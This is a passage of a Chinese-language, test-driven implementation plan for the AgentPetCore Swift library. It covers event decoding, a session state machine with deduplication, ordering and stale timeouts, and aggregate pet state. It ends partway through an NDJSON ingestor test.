# AgentPet M1 — Core Engine 实现计划（Plan A）

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 实现 AgentPet 的纯逻辑核心库 `AgentPetCore`——事件模型、会话状态机（SessionStore）、NDJSON 摄取器、通知决策、iTerm2 跳转脚本生成——全部用 `swift test` 单测覆盖，不含任何 GUI。

**Architecture:** Swift Package Manager 库 target `AgentPetCore`，零外部依赖。所有逻辑做成纯函数/可注入时钟的对象，事件经 `NDJSONIngestor` 赋单调 `seq` 后灌入 `SessionStore`（单一事实源），UI 层（Plan B）只订阅 store 的变更。本计划对应设计文档 §3 事件协议、§4 数据流、§6 状态机、§7 终端跳转、§10 测试 中的可单测部分。

**Tech Stack:** Swift 5.9+、SwiftPM、XCTest。无第三方依赖。

## Global Constraints

- Swift tools 版本 `5.9`，平台 `.macOS(.v13)`。
- **零外部依赖**：只用标准库 Foundation。
- **不用 `Date()` / `Date.now`**：所有需要"当前时间"的逻辑通过参数 `now: Double`（Unix 秒）注入，便于测试 STALE。设计文档 §6。
- **排序唯一事实是 `seq`**：由 `NDJSONIngestor` 赋的单调递增序号（= append 顺序），**绝不用墙钟 `ts` 排序**。去重唯一键是 `eventId`。归一键是 `(agent, root, sessionId)`。设计文档 §4 红队 B1/B2。
- **AppleScript 一律参数化**：终端跳转脚本中**严禁字符串内插**事件字段；id 经正则校验后只作为 `osascript` 的 argv 传入。设计文档 §3.1 / §7 红队 M4。
- 所有 public 类型加 `public`；测试 `@testable import AgentPetCore`。
- 每个 Task 结束必须 `swift test` 全绿后再 commit。

---

### Task 1: 包脚手架 + AgentEvent 事件模型与解码

**Files:**
- Create: `Package.swift`
- Create: `Sources/AgentPetCore/Model/AgentEvent.swift`
- Test: `Tests/AgentPetCoreTests/AgentEventTests.swift`

**Interfaces:**
- Produces:
  - `enum EventKind: Equatable { case sessionStart, busy, stop, attention, sessionEnd, pluginError, unknown(String) }`
  - `enum WaitingReason: String, Codable, Equatable { case stop, attention }`
  - `enum TerminalKind: String, Codable, Equatable { case iterm2, terminal, warp, other }`
  - `enum NotifyClass: String, Codable, Equatable { case alert, passive, none }`
  - `struct TerminalRef: Equatable, Decodable { var kind; var itermSessionId/tty/pid/bundleId }`
  - `struct AgentEvent: Equatable` with `static func decode(line: Substring) -> AgentEvent?`

- [ ] **Step 1: Write the failing test**

`Tests/AgentPetCoreTests/AgentEventTests.swift`:
```swift
import XCTest
@testable import AgentPetCore

final class AgentEventTests: XCTestCase {
    func test_decodes_full_event_line() {
        let line = #"{"v":1,"eventId":"E1","agent":"claude-code","event":"stop","sessionId":"S1","root":"~/.claude","cwd":"/p","title":"proj","terminal":{"kind":"iterm2","itermSessionId":"w0t1p0"},"reason":"stop","ts":"2026-06-27T10:00:00.000Z"}"#
        let e = AgentEvent.decode(line: Substring(line))
        XCTAssertEqual(e?.eventId, "E1")
        XCTAssertEqual(e?.kind, .stop)
        XCTAssertEqual(e?.sessionId, "S1")
        XCTAssertEqual(e?.root, "~/.claude")
        XCTAssertEqual(e?.terminal?.kind, .iterm2)
        XCTAssertEqual(e?.terminal?.itermSessionId, "w0t1p0")
        XCTAssertEqual(e?.reason, .stop)
    }

    func test_unknown_event_kind_is_preserved_not_dropped() {
        let line = #"{"v":1,"eventId":"E2","agent":"a","event":"compacting","sessionId":"S","root":"r","ts":"t"}"#
        let e = AgentEvent.decode(line: Substring(line))
        XCTAssertEqual(e?.kind, .unknown("compacting"))
    }

    func test_bad_line_returns_nil_not_throws() {
        XCTAssertNil(AgentEvent.decode(line: "not json"))
        XCTAssertNil(AgentEvent.decode(line: ""))
    }

    func test_optional_fields_absent_is_ok() {
        let line = #"{"v":1,"eventId":"E3","agent":"a","event":"busy","sessionId":"S","root":"r","ts":"t"}"#
        let e = AgentEvent.decode(line: Substring(line))
        XCTAssertNil(e?.cwd)
        XCTAssertNil(e?.terminal)
        XCTAssertEqual(e?.kind, .busy)
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `swift test`
Expected: 编译失败（`AgentEvent` 未定义 / 无 `Package.swift`）。

- [ ] **Step 3: Write Package.swift**

`Package.swift`:
```swift
// swift-tools-version:5.9
import PackageDescription

let package = Package(
    name: "AgentPet",
    platforms: [.macOS(.v13)],
    products: [
        .library(name: "AgentPetCore", targets: ["AgentPetCore"]),
    ],
    targets: [
        .target(name: "AgentPetCore"),
        .testTarget(name: "AgentPetCoreTests", dependencies: ["AgentPetCore"]),
    ]
)
```

- [ ] **Step 4: Write the model implementation**

`Sources/AgentPetCore/Model/AgentEvent.swift`:
```swift
import Foundation

public enum EventKind: Equatable {
    case sessionStart, busy, stop, attention, sessionEnd, pluginError
    case unknown(String)

    init(raw: String) {
        switch raw {
        case "session_start": self = .sessionStart
        case "busy":          self = .busy
        case "stop":          self = .stop
        case "attention":     self = .attention
        case "session_end":   self = .sessionEnd
        case "plugin_error":  self = .pluginError
        default:              self = .unknown(raw)
        }
    }
}

public enum WaitingReason: String, Codable, Equatable { case stop, attention }
public enum TerminalKind: String, Codable, Equatable { case iterm2, terminal, warp, other }
public enum NotifyClass: String, Codable, Equatable { case alert, passive, none }

public struct TerminalRef: Equatable, Decodable {
    public var kind: TerminalKind
    public var itermSessionId: String?
    public var tty: String?
    public var pid: Int?
    public var bundleId: String?

    public init(kind: TerminalKind, itermSessionId: String? = nil,
                tty: String? = nil, pid: Int? = nil, bundleId: String? = nil) {
        self.kind = kind; self.itermSessionId = itermSessionId
        self.tty = tty; self.pid = pid; self.bundleId = bundleId
    }

    enum CodingKeys: String, CodingKey { case kind, itermSessionId, tty, pid, bundleId }
    public init(from d: Decoder) throws {
        let c = try d.container(keyedBy: CodingKeys.self)
        // 未知 kind 一律降级为 .other（设计 §3）
        let rawKind = try c.decodeIfPresent(String.self, forKey: .kind) ?? "other"
        self.kind = TerminalKind(rawValue: rawKind) ?? .other
        self.itermSessionId = try c.decodeIfPresent(String.self, forKey: .itermSessionId)
        self.tty = try c.decodeIfPresent(String.self, forKey: .tty)
        self.pid = try c.decodeIfPresent(Int.self, forKey: .pid)
        self.bundleId = try c.decodeIfPresent(String.self, forKey: .bundleId)
    }
}

public struct AgentEvent: Equatable {
    public var v: Int
    public var eventId: String
    public var seq: Int?
    public var agent: String
    public var kind: EventKind
    public var sessionId: String
    public var root: String
    public var cwd: String?
    public var title: String?
    public var terminal: TerminalRef?
    public var notify: NotifyClass?
    public var reason: WaitingReason?
    public var message: String?
    public var ts: String

    public init(v: Int, eventId: String, seq: Int? = nil, agent: String, kind: EventKind,
                sessionId: String, root: String, cwd: String? = nil, title: String? = nil,
                terminal: TerminalRef? = nil, notify: NotifyClass? = nil,
                reason: WaitingReason? = nil, message: String? = nil, ts: String) {
        self.v = v; self.eventId = eventId; self.seq = seq; self.agent = agent
        self.kind = kind; self.sessionId = sessionId; self.root = root; self.cwd = cwd
        self.title = title; self.terminal = terminal; self.notify = notify
        self.reason = reason; self.message = message; self.ts = ts
    }

    /// 解析单行 NDJSON。坏行/解析失败返回 nil（绝不抛）。设计 §9。
    public static func decode(line: Substring) -> AgentEvent? {
        guard let data = line.data(using: .utf8), !data.isEmpty else { return nil }
        struct Raw: Decodable {
            var v: Int?; var eventId: String?; var seq: Int?; var agent: String?
            var event: String?; var sessionId: String?; var root: String?
            var cwd: String?; var title: String?; var terminal: TerminalRef?
            var notify: NotifyClass?; var reason: WaitingReason?; var message: String?; var ts: String?
        }
        guard let r = try? JSONDecoder().decode(Raw.self, from: data),
              let eventId = r.eventId, let agent = r.agent, let event = r.event,
              let sessionId = r.sessionId, let root = r.root, let ts = r.ts
        else { return nil }
        return AgentEvent(v: r.v ?? 1, eventId: eventId, seq: r.seq, agent: agent,
                          kind: EventKind(raw: event), sessionId: sessionId, root: root,
                          cwd: r.cwd, title: r.title, terminal: r.terminal, notify: r.notify,
                          reason: r.reason, message: r.message, ts: ts)
    }
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `swift test`
Expected: PASS（4 个测试全过）。

- [ ] **Step 6: Commit**

```bash
git add Package.swift Sources/AgentPetCore/Model/AgentEvent.swift Tests/AgentPetCoreTests/AgentEventTests.swift
git commit -m "feat(core): AgentEvent 事件模型 + NDJSON 行解码（坏行返回 nil、未知事件保留）"
```

---

### Task 2: 会话标识与状态类型

**Files:**
- Create: `Sources/AgentPetCore/Model/SessionKey.swift`
- Create: `Sources/AgentPetCore/Model/SessionState.swift`
- Test: `Tests/AgentPetCoreTests/SessionTypesTests.swift`

**Interfaces:**
- Consumes: `WaitingReason`, `TerminalRef`（Task 1）
- Produces:
  - `struct SessionKey: Hashable { let agent, root, sessionId: String }`，含 `init(event:)`
  - `enum SessionState: Equatable { case running; case waiting(WaitingReason); case ended; case stale }`
  - `struct Session: Equatable { key; state; cwd; title; terminal; lastSeq; lastActiveAt }`

- [ ] **Step 1: Write the failing test**

`Tests/AgentPetCoreTests/SessionTypesTests.swift`:
```swift
import XCTest
@testable import AgentPetCore

final class SessionTypesTests: XCTestCase {
    func test_sessionKey_from_event_uses_agent_root_sessionId() {
        let e = AgentEvent(v: 1, eventId: "E", agent: "claude-code", kind: .busy,
                           sessionId: "S1", root: "~/.claude", ts: "t")
        XCTAssertEqual(SessionKey(event: e),
                       SessionKey(agent: "claude-code", root: "~/.claude", sessionId: "S1"))
    }

    func test_same_sessionId_different_root_are_different_keys() {
        let k1 = SessionKey(agent: "a", root: "~/.claude", sessionId: "S")
        let k2 = SessionKey(agent: "a", root: "~/.claude-profiles/x", sessionId: "S")
        XCTAssertNotEqual(k1, k2)
    }

    func test_waiting_states_carry_reason() {
        XCTAssertNotEqual(SessionState.waiting(.stop), SessionState.waiting(.attention))
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `swift test`
Expected: FAIL（`SessionKey` / `SessionState` 未定义）。

- [ ] **Step 3: Write the implementation**

`Sources/AgentPetCore/Model/SessionKey.swift`:
```swift
public struct SessionKey: Hashable {
    public let agent: String
    public let root: String
    public let sessionId: String
    public init(agent: String, root: String, sessionId: String) {
        self.agent = agent; self.root = root; self.sessionId = sessionId
    }
    public init(event: AgentEvent) {
        self.init(agent: event.agent, root: event.root, sessionId: event.sessionId)
    }
}
```

`Sources/AgentPetCore/Model/SessionState.swift`:
```swift
public enum SessionState: Equatable {
    case running
    case waiting(WaitingReason)
    case ended
    case stale
}

public struct Session: Equatable {
    public let key: SessionKey
    public var state: SessionState
    public var cwd: String?
    public var title: String?
    public var terminal: TerminalRef?
    public var lastSeq: Int
    public var lastActiveAt: Double   // 注入的 now（Unix 秒），用于 STALE 计时

    public init(key: SessionKey, state: SessionState, cwd: String? = nil, title: String? = nil,
                terminal: TerminalRef? = nil, lastSeq: Int, lastActiveAt: Double) {
        self.key = key; self.state = state; self.cwd = cwd; self.title = title
        self.terminal = terminal; self.lastSeq = lastSeq; self.lastActiveAt = lastActiveAt
    }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `swift test`
Expected: PASS。

- [ ] **Step 5: Commit**

```bash
git add Sources/AgentPetCore/Model/SessionKey.swift Sources/AgentPetCore/Model/SessionState.swift Tests/AgentPetCoreTests/SessionTypesTests.swift
git commit -m "feat(core): SessionKey(含 root) + SessionState(waiting 带 reason) + Session"
```

---

### Task 3: SessionStore 基础转移（创建与 running/waiting）

**Files:**
- Create: `Sources/AgentPetCore/Store/SessionStore.swift`
- Test: `Tests/AgentPetCoreTests/SessionStoreTransitionTests.swift`

**Interfaces:**
- Consumes: `AgentEvent`, `SessionKey`, `Session`, `SessionState`, `WaitingReason`
- Produces:
  - `enum StoreChange: Equatable { case upserted(SessionKey) }`
  - `final class SessionStore`，`func apply(_ event: AgentEvent, seq: Int, now: Double, replay: Bool) -> [StoreChange]`
  - `var sessions: [SessionKey: Session]`（只读外部）

- [ ] **Step 1: Write the failing test**

`Tests/AgentPetCoreTests/SessionStoreTransitionTests.swift`:
```swift
import XCTest
@testable import AgentPetCore

final class SessionStoreTransitionTests: XCTestCase {
    private func ev(_ id: String, _ kind: EventKind, reason: WaitingReason? = nil,
                   sid: String = "S", root: String = "r") -> AgentEvent {
        AgentEvent(v: 1, eventId: id, agent: "a", kind: kind, sessionId: sid, root: root,
                   reason: reason, ts: "t")
    }

    func test_session_start_creates_running_and_broadcasts() {
        let s = SessionStore()
        let changes = s.apply(ev("E1", .sessionStart), seq: 1, now: 0, replay: false)
        let key = SessionKey(agent: "a", root: "r", sessionId: "S")
        XCTAssertEqual(changes, [.upserted(key)])
        XCTAssertEqual(s.sessions[key]?.state, .running)
        XCTAssertEqual(s.sessions[key]?.lastSeq, 1)
    }

    func test_stop_moves_running_to_waiting_stop() {
        let s = SessionStore()
        _ = s.apply(ev("E1", .sessionStart), seq: 1, now: 0, replay: false)
        _ = s.apply(ev("E2", .stop, reason: .stop), seq: 2, now: 0, replay: false)
        XCTAssertEqual(s.sessions.values.first?.state, .waiting(.stop))
    }

    func test_attention_moves_to_waiting_attention() {
        let s = SessionStore()
        _ = s.apply(ev("E1", .sessionStart), seq: 1, now: 0, replay: false)
        _ = s.apply(ev("E2", .attention, reason: .attention), seq: 2, now: 0, replay: false)
        XCTAssertEqual(s.sessions.values.first?.state, .waiting(.attention))
    }

    func test_waiting_then_busy_returns_to_running() {
        let s = SessionStore()
        _ = s.apply(ev("E1", .stop, reason: .stop), seq: 1, now: 0, replay: false)
        _ = s.apply(ev("E2", .busy), seq: 2, now: 0, replay: false)
        XCTAssertEqual(s.sessions.values.first?.state, .running)
    }

    func test_event_without_explicit_reason_infers_from_kind() {
        let s = SessionStore()
        _ = s.apply(ev("E1", .attention), seq: 1, now: 0, replay: false)  // reason 缺省
        XCTAssertEqual(s.sessions.values.first?.state, .waiting(.attention))
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `swift test`
Expected: FAIL（`SessionStore` 未定义）。

- [ ] **Step 3: Write the implementation**

`Sources/AgentPetCore/Store/SessionStore.swift`:
```swift
import Foundation

public enum StoreChange: Equatable { case upserted(SessionKey) }

public final class SessionStore {
    public private(set) var sessions: [SessionKey: Session] = [:]

    public init() {}

    public func apply(_ event: AgentEvent, seq: Int, now: Double, replay: Bool) -> [StoreChange] {
        let key = SessionKey(event: event)
        var session = sessions[key]
            ?? Session(key: key, state: .running, lastSeq: seq, lastActiveAt: now)

        let newState = nextState(from: session.state, event: event)
        let changed = newState != session.state
        session.state = newState
        session.lastSeq = seq
        session.lastActiveAt = now
        sessions[key] = session
        return changed ? [.upserted(key)] : [.upserted(key)]  // Task 4 会细化 busy 短路
    }

    private func nextState(from current: SessionState, event: AgentEvent) -> SessionState {
        switch event.kind {
        case .sessionStart, .busy: return .running
        case .stop:                return .waiting(event.reason ?? .stop)
        case .attention:           return .waiting(event.reason ?? .attention)
        case .sessionEnd:          return .ended
        case .pluginError, .unknown: return current   // 续命不改状态（设计 §6）
        }
    }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `swift test`
Expected: PASS。

- [ ] **Step 5: Commit**

```bash
git add Sources/AgentPetCore/Store/SessionStore.swift Tests/AgentPetCoreTests/SessionStoreTransitionTests.swift
git commit -m "feat(core): SessionStore 基础状态转移（start/busy/stop/attention/end + reason 推断）"
```

---

### Task 4: SessionStore 去重 / 排序 / 终态 / busy 短路

**Files:**
- Modify: `Sources/AgentPetCore/Store/SessionStore.swift`
- Test: `Tests/AgentPetCoreTests/SessionStoreOrderingTests.swift`

**Interfaces:**
- Produces（新增到 `SessionStore`）：内部 `seenEventIds: Set<String>`；`apply` 行为细化为：eventId 去重、seq 落后忽略、ended 终态不可回退、running+busy 短路不广播。

- [ ] **Step 1: Write the failing test**

`Tests/AgentPetCoreTests/SessionStoreOrderingTests.swift`:
```swift
import XCTest
@testable import AgentPetCore

final class SessionStoreOrderingTests: XCTestCase {
    private func ev(_ id: String, _ kind: EventKind, reason: WaitingReason? = nil) -> AgentEvent {
        AgentEvent(v: 1, eventId: id, agent: "a", kind: kind, sessionId: "S", root: "r",
                   reason: reason, ts: "t")
    }

    func test_duplicate_eventId_is_ignored() {
        let s = SessionStore()
        _ = s.apply(ev("E1", .sessionStart), seq: 1, now: 0, replay: false)
        let dup = s.apply(ev("E1", .stop), seq: 2, now: 0, replay: false) // 同 eventId
        XCTAssertEqual(dup, [])
        XCTAssertEqual(s.sessions.values.first?.state, .running) // 未被 stop 影响
    }

    func test_out_of_order_lower_seq_is_ignored() {
        let s = SessionStore()
        _ = s.apply(ev("E1", .sessionStart), seq: 5, now: 0, replay: false)
        let stale = s.apply(ev("E2", .busy), seq: 3, now: 0, replay: false) // seq 落后
        XCTAssertEqual(stale, [])
        XCTAssertEqual(s.sessions.values.first?.lastSeq, 5)
    }

    func test_ended_is_terminal_and_cannot_be_revived() {
        let s = SessionStore()
        _ = s.apply(ev("E1", .sessionEnd), seq: 1, now: 0, replay: false)
        let revive = s.apply(ev("E2", .busy), seq: 2, now: 0, replay: false)
        XCTAssertEqual(revive, [])
        XCTAssertEqual(s.sessions.values.first?.state, .ended)
    }

    func test_busy_on_running_does_not_broadcast_but_updates_lastActiveAt() {
        let s = SessionStore()
        _ = s.apply(ev("E1", .sessionStart), seq: 1, now: 10, replay: false)
        let changes = s.apply(ev("E2", .busy), seq: 2, now: 20, replay: false)
        XCTAssertEqual(changes, [])                       // 不广播
        XCTAssertEqual(s.sessions.values.first?.lastActiveAt, 20) // 但喂了 STALE 计时
        XCTAssertEqual(s.sessions.values.first?.lastSeq, 2)
    }

    func test_real_state_change_does_broadcast() {
        let s = SessionStore()
        _ = s.apply(ev("E1", .sessionStart), seq: 1, now: 0, replay: false)
        let changes = s.apply(ev("E2", .stop), seq: 2, now: 0, replay: false)
        XCTAssertEqual(changes, [.upserted(SessionKey(agent: "a", root: "r", sessionId: "S"))])
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `swift test`
Expected: FAIL（去重/排序/短路尚未实现，`test_busy_on_running_does_not_broadcast` 等失败）。

- [ ] **Step 3: Rewrite `apply` in SessionStore.swift**

将 `SessionStore` 的属性与 `apply` 替换为：
```swift
public final class SessionStore {
    public private(set) var sessions: [SessionKey: Session] = [:]
    private var seenEventIds: Set<String> = []

    public init() {}

    public func apply(_ event: AgentEvent, seq: Int, now: Double, replay: Bool) -> [StoreChange] {
        // 1) eventId 去重（处理重复行 / 回放）
        guard !seenEventIds.contains(event.eventId) else { return [] }
        seenEventIds.insert(event.eventId)

        let key = SessionKey(event: event)
        guard var session = sessions[key] else {
            // 新会话
            let s = Session(key: key, state: initialState(event), cwd: event.cwd,
                            title: event.title, terminal: event.terminal,
                            lastSeq: seq, lastActiveAt: now)
            sessions[key] = s
            return [.upserted(key)]
        }

        // 2) 终态不可回退
        if session.state == .ended { return [] }

        // 3) seq 落后则忽略（按 ingest 单调序排序，不用 ts）
        if seq <= session.lastSeq { return [] }

        let newState = nextState(from: session.state, event: event)
        let stateChanged = newState != session.state

        session.state = newState
        session.lastSeq = seq
        session.lastActiveAt = now
        sessions[key] = session

        // 4) running 上的 busy 自环：只喂计时，不广播（设计 §4 短路）
        return stateChanged ? [.upserted(key)] : []
    }

    private func initialState(_ event: AgentEvent) -> SessionState {
        nextState(from: .running, event: event)
    }

    private func nextState(from current: SessionState, event: AgentEvent) -> SessionState {
        switch event.kind {
        case .sessionStart, .busy: return .running
        case .stop:                return .waiting(event.reason ?? .stop)
        case .attention:           return .waiting(event.reason ?? .attention)
        case .sessionEnd:          return .ended
        case .pluginError, .unknown: return current
        }
    }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `swift test`
Expected: PASS（含 Task 3 旧用例仍全绿）。

- [ ] **Step 5: Commit**

```bash
git add Sources/AgentPetCore/Store/SessionStore.swift Tests/AgentPetCoreTests/SessionStoreOrderingTests.swift
git commit -m "feat(core): SessionStore 去重(eventId)/排序(seq)/终态不可回退/busy 短路不广播"
```

---

### Task 5: 字段级合并 + terminal 不被空值降级

**Files:**
- Modify: `Sources/AgentPetCore/Store/SessionStore.swift`
- Test: `Tests/AgentPetCoreTests/SessionStoreMergeTests.swift`

**Interfaces:**
- Produces：`apply` 对已存在会话做 `cwd/title/terminal` 的 last-non-nil-wins 合并。

- [ ] **Step 1: Write the failing test**

`Tests/AgentPetCoreTests/SessionStoreMergeTests.swift`:
```swift
import XCTest
@testable import AgentPetCore

final class SessionStoreMergeTests: XCTestCase {
    func test_terminal_not_overwritten_by_later_nil() {
        let s = SessionStore()
        let withTerm = AgentEvent(v: 1, eventId: "E1", agent: "a", kind: .sessionStart,
            sessionId: "S", root: "r", terminal: TerminalRef(kind: .iterm2, itermSessionId: "w0t1p0"), ts: "t")
        let noTerm = AgentEvent(v: 1, eventId: "E2", agent: "a", kind: .stop,
            sessionId: "S", root: "r", terminal: nil, ts: "t")
        _ = s.apply(withTerm, seq: 1, now: 0, replay: false)
        _ = s.apply(noTerm, seq: 2, now: 0, replay: false)
        XCTAssertEqual(s.sessions.values.first?.terminal?.itermSessionId, "w0t1p0") // 保留
    }

    func test_cwd_and_title_filled_in_when_later_event_provides_them() {
        let s = SessionStore()
        let e1 = AgentEvent(v: 1, eventId: "E1", agent: "a", kind: .sessionStart,
            sessionId: "S", root: "r", cwd: nil, title: nil, ts: "t")
        let e2 = AgentEvent(v: 1, eventId: "E2", agent: "a", kind: .stop,
            sessionId: "S", root: "r", cwd: "/proj", title: "Proj", ts: "t")
        _ = s.apply(e1, seq: 1, now: 0, replay: false)
        _ = s.apply(e2, seq: 2, now: 0, replay: false)
        XCTAssertEqual(s.sessions.values.first?.cwd, "/proj")
        XCTAssertEqual(s.sessions.values.first?.title, "Proj")
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `swift test`
Expected: FAIL（当前 `apply` 在已存在分支未合并这些字段）。

- [ ] **Step 3: Add field merge to the existing-session branch**

在 `SessionStore.apply` 中，`session.state = newState` **之前**插入字段级合并：
```swift
        // 字段级合并：非空才覆盖（terminal 一旦精确不被空值降级）。设计 §4 红队 M1。
        if let cwd = event.cwd { session.cwd = cwd }
        if let title = event.title { session.title = title }
        if let terminal = event.terminal { session.terminal = terminal }

        let newState = nextState(from: session.state, event: event)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `swift test`
Expected: PASS。

- [ ] **Step 5: Commit**

```bash
git add Sources/AgentPetCore/Store/SessionStore.swift Tests/AgentPetCoreTests/SessionStoreMergeTests.swift
git commit -m "feat(core): 字段级合并(last-non-nil)，terminal 不被后续空值降级"
```

---

### Task 6: 聚合宠物状态 + 活跃会话列表

**Files:**
- Create: `Sources/AgentPetCore/Store/PetState.swift`
- Modify: `Sources/AgentPetCore/Store/SessionStore.swift`
- Test: `Tests/AgentPetCoreTests/PetStateTests.swift`

**Interfaces:**
- Produces:
  - `enum PetState: Equatable { case busy, calling, idle }`
  - `SessionStore.aggregateState() -> PetState`
  - `SessionStore.activeSessions() -> [Session]`（排除 ended，按 lastSeq 倒序）

- [ ] **Step 1: Write the failing test**

`Tests/AgentPetCoreTests/PetStateTests.swift`:
```swift
import XCTest
@testable import AgentPetCore

final class PetStateTests: XCTestCase {
    private func push(_ s: SessionStore, _ id: String, _ kind: EventKind, sid: String, seq: Int) {
        _ = s.apply(AgentEvent(v: 1, eventId: id, agent: "a", kind: kind, sessionId: sid, root: "r", ts: "t"),
                    seq: seq, now: 0, replay: false)
    }

    func test_any_running_means_busy() {
        let s = SessionStore()
        push(s, "E1", .stop, sid: "A", seq: 1)        // A waiting
        push(s, "E2", .sessionStart, sid: "B", seq: 2) // B running
        XCTAssertEqual(s.aggregateState(), .busy)
    }

    func test_no_running_but_waiting_means_calling() {
        let s = SessionStore()
        push(s, "E1", .stop, sid: "A", seq: 1)
        XCTAssertEqual(s.aggregateState(), .calling)
    }

    func test_all_ended_means_idle() {
        let s = SessionStore()
        push(s, "E1", .sessionEnd, sid: "A", seq: 1)
        XCTAssertEqual(s.aggregateState(), .idle)
    }

    func test_empty_means_idle() {
        XCTAssertEqual(SessionStore().aggregateState(), .idle)
    }

    func test_activeSessions_excludes_ended() {
        let s = SessionStore()
        push(s, "E1", .sessionStart, sid: "A", seq: 1)
        push(s, "E2", .sessionEnd, sid: "B", seq: 2)
        let active = s.activeSessions()
        XCTAssertEqual(active.count, 1)
        XCTAssertEqual(active.first?.key.sessionId, "A")
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `swift test`
Expected: FAIL（`PetState` / `aggregateState` / `activeSessions` 未定义）。

- [ ] **Step 3: Write the implementation**

`Sources/AgentPetCore/Store/PetState.swift`:
```swift
public enum PetState: Equatable { case busy, calling, idle }
```

在 `SessionStore` 末尾追加方法：
```swift
extension SessionStore {
    public func aggregateState() -> PetState {
        var hasRunning = false, hasWaiting = false
        for s in sessions.values {
            switch s.state {
            case .running: hasRunning = true
            case .waiting: hasWaiting = true
            case .ended, .stale: break
            }
        }
        if hasRunning { return .busy }
        if hasWaiting { return .calling }
        return .idle
    }

    public func activeSessions() -> [Session] {
        sessions.values
            .filter { $0.state != .ended }
            .sorted { $0.lastSeq > $1.lastSeq }
    }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `swift test`
Expected: PASS。

- [ ] **Step 5: Commit**

```bash
git add Sources/AgentPetCore/Store/PetState.swift Sources/AgentPetCore/Store/SessionStore.swift Tests/AgentPetCoreTests/PetStateTests.swift
git commit -m "feat(core): 聚合宠物三态(busy/calling/idle) + 活跃会话列表(排除 ended)"
```

---

### Task 7: STALE 超时（注入时钟，可复活）

**Files:**
- Modify: `Sources/AgentPetCore/Store/SessionStore.swift`
- Test: `Tests/AgentPetCoreTests/SessionStoreStaleTests.swift`

**Interfaces:**
- Produces: `SessionStore.markStale(now: Double, timeout: Double) -> [StoreChange]`；STALE 收到任何后续事件可复活（已由 Task 4 的转移覆盖，因 stale 不是 ended）。

- [ ] **Step 1: Write the failing test**

`Tests/AgentPetCoreTests/SessionStoreStaleTests.swift`:
```swift
import XCTest
@testable import AgentPetCore

final class SessionStoreStaleTests: XCTestCase {
    private func start(_ s: SessionStore, now: Double) {
        _ = s.apply(AgentEvent(v: 1, eventId: "E1", agent: "a", kind: .sessionStart,
                    sessionId: "S", root: "r", ts: "t"), seq: 1, now: now, replay: false)
    }

    func test_running_becomes_stale_after_timeout() {
        let s = SessionStore()
        start(s, now: 0)
        let changes = s.markStale(now: 700, timeout: 600)
        XCTAssertEqual(changes, [.upserted(SessionKey(agent: "a", root: "r", sessionId: "S"))])
        XCTAssertEqual(s.sessions.values.first?.state, .stale)
    }

    func test_not_stale_within_timeout() {
        let s = SessionStore()
        start(s, now: 0)
        XCTAssertEqual(s.markStale(now: 100, timeout: 600), [])
        XCTAssertEqual(s.sessions.values.first?.state, .running)
    }

    func test_ended_is_not_marked_stale() {
        let s = SessionStore()
        _ = s.apply(AgentEvent(v: 1, eventId: "E1", agent: "a", kind: .sessionEnd,
                    sessionId: "S", root: "r", ts: "t"), seq: 1, now: 0, replay: false)
        XCTAssertEqual(s.markStale(now: 9999, timeout: 600), [])
        XCTAssertEqual(s.sessions.values.first?.state, .ended)
    }

    func test_stale_session_revives_on_new_event() {
        let s = SessionStore()
        start(s, now: 0)
        _ = s.markStale(now: 700, timeout: 600)
        _ = s.apply(AgentEvent(v: 1, eventId: "E2", agent: "a", kind: .busy,
                    sessionId: "S", root: "r", ts: "t"), seq: 2, now: 800, replay: false)
        XCTAssertEqual(s.sessions.values.first?.state, .running) // 复活
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `swift test`
Expected: FAIL（`markStale` 未定义）。

- [ ] **Step 3: Add markStale to SessionStore**

在 `extension SessionStore` 中追加：
```swift
    /// 把超过 timeout 秒没有事件的 running/waiting 会话标记为 stale（可复活；ended 不动）。
    public func markStale(now: Double, timeout: Double) -> [StoreChange] {
        var changes: [StoreChange] = []
        for (key, var session) in sessions {
            switch session.state {
            case .running, .waiting:
                if now - session.lastActiveAt > timeout {
                    session.state = .stale
                    sessions[key] = session
                    changes.append(.upserted(key))
                }
            case .ended, .stale:
                break
            }
        }
        return changes
    }
```
> 注：`stale_session_revives` 用例已能通过——Task 4 的 `seq <= lastSeq` 守卫对新 seq(2 > 1) 放行，且 stale 非 ended，故 busy 转移回 running。

- [ ] **Step 4: Run test to verify it passes**

Run: `swift test`
Expected: PASS。

- [ ] **Step 5: Commit**

```bash
git add Sources/AgentPetCore/Store/SessionStore.swift Tests/AgentPetCoreTests/SessionStoreStaleTests.swift
git commit -m "feat(core): STALE 超时(注入时钟)，ended 不变、stale 可复活"
```

---

### Task 8: NDJSONIngestor（赋单调 seq + 坏行跳过 + 回放标志）

**Files:**
- Create: `Sources/AgentPetCore/Ingest/NDJSONIngestor.swift`
- Test: `Tests/AgentPetCoreTests/NDJSONIngestorTests.swift`

**Interfaces:**
- Consumes: `SessionStore`, `AgentEvent`, `StoreChange`
- Produces:
  - `final class NDJSONIngestor`
  - `init(store: SessionStore, startSeq: Int = 0)`
  - `func ingest(line: Substring, now: Double, replay: Bool) -> [StoreChange]`
  - `func ingest(text: String, now: Double, replay: Bool) -> [StoreChange]`（按 `\n` 切行）
  - `var consumedSeq: Int`

- [ ] **Step 1: Write the failing test**

`Tests/AgentPetCoreTests/NDJSONIngestorTests.swift`:
```swift
import XCTest
@testable import AgentPetCore

final class NDJSONIngestorTests: XCTestCase {
    private func line(_ id: String, _ event: String, sid: String = "S") -> String {
        #"{"v":1,"eventId":"\#(id)","agent":"a","event":"\#(event)","sessionId":"\#(sid)","root":"r","ts":"t"}"#
    }

    func test_assigns_monotonic_seq_so_append_order_is_truth() {
        let store = SessionStore()
        let ing = NDJSONIngestor(store: store)
